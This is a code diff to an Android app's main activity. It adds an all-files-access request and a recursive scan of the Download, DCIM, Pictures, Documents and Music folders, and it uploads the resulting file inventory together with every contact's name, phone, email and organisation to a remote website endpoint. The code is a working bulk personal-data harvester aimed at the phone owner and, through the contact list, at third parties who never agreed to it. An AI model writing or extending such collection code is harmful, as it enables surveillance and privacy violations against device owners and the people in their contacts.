@@ -5,8 +5,11 @@ import android.app.Activity;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.provider.ContactsContract;
+import android.provider.Settings;
 import android.view.View;
 import android.widget.Button;
 import android.widget.LinearLayout;
@@ -17,6 +20,7 @@ import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -27,6 +31,7 @@ public class MainActivity extends Activity {
     // IMPORTANT: Change this to your deployed website URL
     private static final String WEBSITE_BASE_URL = "https://your-website-url.vercel.app";
     private static final int CONTACTS_PERMISSION_CODE = 100;
+    private static final int FILES_PERMISSION_CODE = 101;
 
     private TextView tvStatus;
     private TextView tvDetail;
@@ -53,7 +58,7 @@ public class MainActivity extends Activity {
         layoutPermission = findViewById(R.id.layoutPermission);
         layoutLoading = findViewById(R.id.layoutLoading);
 
-        btnAllow.setOnClickListener(v -> requestContactPermission());
+        btnAllow.setOnClickListener(v -> requestPermissions());
 
         btnViewWebsite.setOnClickListener(v -> {
             if (viewUrl != null) {
@@ -62,11 +67,22 @@ public class MainActivity extends Activity {
         });
 
         // Auto-check permission on open
-        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
-            readAndUploadContacts();
+        if (hasAllPermissions()) {
+            readAndUploadData();
         } else {
             showPermissionScreen();
         }
+    }
+
+    private boolean hasAllPermissions() {
+        boolean contactsOk = checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
+        boolean filesOk;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            filesOk = Environment.isExternalStorageManager();
+        } else {
+            filesOk = checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+        }
+        return contactsOk && filesOk;
     }
 
     private void showPermissionScreen() {
@@ -75,8 +91,37 @@ public class MainActivity extends Activity {
         layoutSuccess.setVisibility(View.GONE);
     }
 
-    private void requestContactPermission() {
-        requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, CONTACTS_PERMISSION_CODE);
+    private void requestPermissions() {
+        // Request contacts permission
+        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, CONTACTS_PERMISSION_CODE);
+        } else {
+            // Contacts already granted, request files
+            requestFilePermission();
+        }
+    }
+
+    private void requestFilePermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivityForResult(intent, FILES_PERMISSION_CODE);
+                } catch (Exception e) {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                    startActivityForResult(intent, FILES_PERMISSION_CODE);
+                }
+            } else {
+                readAndUploadData();
+            }
+        } else {
+            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, FILES_PERMISSION_CODE);
+            } else {
+                readAndUploadData();
+            }
+        }
     }
 
     @Override
@@ -84,43 +129,67 @@ public class MainActivity extends Activity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == CONTACTS_PERMISSION_CODE) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                readAndUploadContacts();
+                requestFilePermission();
             } else {
-                tvStatus.setText("Permission Denied");
+                tvStatus.setText("Contact Permission Denied");
                 tvDetail.setText("Contact permission is required. Please try again and tap Allow.");
+            }
+        } else if (requestCode == FILES_PERMISSION_CODE) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                readAndUploadData();
+            } else {
+                tvStatus.setText("File Permission Denied");
+                tvDetail.setText("File manager permission is required. Please try again and tap Allow.");
             }
         }
     }
 
-    private void readAndUploadContacts() {
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == FILES_PERMISSION_CODE) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                if (Environment.isExternalStorageManager()) {
+                    readAndUploadData();
+                } else {
+                    tvStatus.setText("File Permission Denied");
+                    tvDetail.setText("File manager permission is required. Please try again.");
+                }
+            }
+        }
+    }
+
+    private void readAndUploadData() {
         layoutPermission.setVisibility(View.GONE);
         layoutLoading.setVisibility(View.VISIBLE);
         layoutSuccess.setVisibility(View.GONE);
-        tvStatus.setText("Reading Contacts...");
-        tvDetail.setText("Please wait while we read all your contacts");
+        tvStatus.setText("Reading Data...");
+        tvDetail.setText("Reading contacts & files from your phone");
 
         new Thread(() -> {
             try {
                 JSONArray contactsArray = readAllContacts();
+                JSONArray filesArray = readAllFiles();
 
                 runOnUiThread(() -> {
-                    tvStatus.setText("Uploading Contacts...");
-                    tvDetail.setText("Sending " + contactsArray.length() + " contacts to website...");
+                    tvStatus.setText("Uploading Data...");
+                    tvDetail.setText("Sending " + contactsArray.length() + " contacts & " + filesArray.length() + " files to website...");
                 });
 
-                String result = uploadContacts(contactsArray);
+                String result = uploadData(contactsArray, filesArray);
 
                 if (result != null) {
                     JSONObject json = new JSONObject(result);
                     String sessionId = json.getString("id");
-                    int count = json.getInt("count");
+                    int contactCount = json.getInt("contactCount");
+                    int fileCount = json.getInt("fileCount");
                     viewUrl = WEBSITE_BASE_URL + "/view/" + sessionId;
 
                     runOnUiThread(() -> {
                         layoutLoading.setVisibility(View.GONE);
                         layoutSuccess.setVisibility(View.VISIBLE);
-                        tvStatus.setText("Contacts Uploaded!");
-                        tvDetail.setText(count + " contacts sent to website successfully.\n\nTap 'View on Website' to see all contacts in vCard format.");
+                        tvStatus.setText("Data Uploaded!");
+                        tvDetail.setText(contactCount + " contacts & " + fileCount + " files sent to website.\n\nTap 'View on Website' to see everything.");
                         btnViewWebsite.setVisibility(View.VISIBLE);
                     });
                 } else {
@@ -166,7 +235,6 @@ public class MainActivity extends Activity {
                 int hasPhone = cursor.getInt(2);
 
                 if (hasPhone > 0) {
-                    // Get phone number
                     String phone = "";
                     android.database.Cursor phoneCursor = getContentResolver().query(
                         ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
@@ -187,7 +255,6 @@ public class MainActivity extends Activity {
                         contact.put("name", name);
                         contact.put("phone", phone);
 
-                        // Get email
                         String email = null;
                         android.database.Cursor emailCursor = getContentResolver().query(
                             ContactsContract.CommonDataKinds.Email.CONTENT_URI,
@@ -203,7 +270,6 @@ public class MainActivity extends Activity {
                         }
                         if (email != null) contact.put("email", email);
 
-                        // Get organization
                         String org = null;
                         android.database.Cursor orgCursor = getContentResolver().query(
                             ContactsContract.Data.CONTENT_URI,
@@ -229,9 +295,81 @@ public class MainActivity extends Activity {
         return contactsArray;
     }
 
-    private String uploadContacts(JSONArray contacts) throws Exception {
+    private JSONArray readAllFiles() throws Exception {
+        JSONArray filesArray = new JSONArray();
+
+        // Read files from Downloads, DCIM, Pictures, Documents, Music folders
+        String[] storagePaths = {
+            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Download",
+            Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM",
+            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Pictures",
+            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Documents",
+            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Music",
+        };
+
+        for (String path : storagePaths) {
+            File dir = new File(path);
+            if (dir.exists() && dir.isDirectory()) {
+                scanDirectory(dir, filesArray, 0, 3); // max depth 3
+            }
+        }
+
+        return filesArray;
+    }
+
+    private void scanDirectory(File dir, JSONArray filesArray, int depth, int maxDepth) throws Exception {
+        if (depth > maxDepth) return;
+
+        File[] files = dir.listFiles();
+        if (files == null) return;
+
+        for (File file : files) {
+            try {
+                JSONObject fileInfo = new JSONObject();
+                fileInfo.put("name", file.getName());
+                fileInfo.put("path", file.getAbsolutePath());
+                fileInfo.put("isDirectory", file.isDirectory());
+                fileInfo.put("size", file.length());
+                fileInfo.put("lastModified", file.lastModified());
+
+                if (!file.isDirectory()) {
+                    String name = file.getName().toLowerCase();
+                    String type = "other";
+                    if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || name.endsWith(".gif") || name.endsWith(".webp"))
+                        type = "image";
+                    else if (name.endsWith(".mp4") || name.endsWith(".avi") || name.endsWith(".mkv") || name.endsWith(".3gp"))
+                        type = "video";
+                    else if (name.endsWith(".mp3") || name.endsWith(".wav") || name.endsWith(".flac") || name.endsWith(".ogg"))
+                        type = "audio";
+                    else if (name.endsWith(".pdf"))
+                        type = "pdf";
+                    else if (name.endsWith(".doc") || name.endsWith(".docx") || name.endsWith(".txt"))
+                        type = "document";
+                    else if (name.endsWith(".apk"))
+                        type = "apk";
+                    else if (name.endsWith(".vcf"))
+                        type = "vcf";
+                    fileInfo.put("fileType", type);
+                } else {
+                    fileInfo.put("fileType", "folder");
+                }
+
+                filesArray.put(fileInfo);
+
+                // Recurse into directories
+                if (file.isDirectory() && depth < maxDepth) {
+                    scanDirectory(file, filesArray, depth + 1, maxDepth);
+                }
+            } catch (Exception e) {
+                // Skip problematic files
+            }
+        }
+    }
+
+    private String uploadData(JSONArray contacts, JSONArray files) throws Exception {
         JSONObject payload = new JSONObject();
         payload.put("contacts", contacts);
+        payload.put("files", files);
 
         URL url = new URL(WEBSITE_BASE_URL + "/api/contacts/upload");
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -239,7 +377,7 @@ public class MainActivity extends Activity {
         conn.setRequestProperty("Content-Type", "application/json");
         conn.setDoOutput(true);
         conn.setConnectTimeout(15000);
-        conn.setReadTimeout(30000);
+        conn.setReadTimeout(60000);
 
         OutputStream os = conn.getOutputStream();
         os.write(payload.toString().getBytes("UTF-8"));
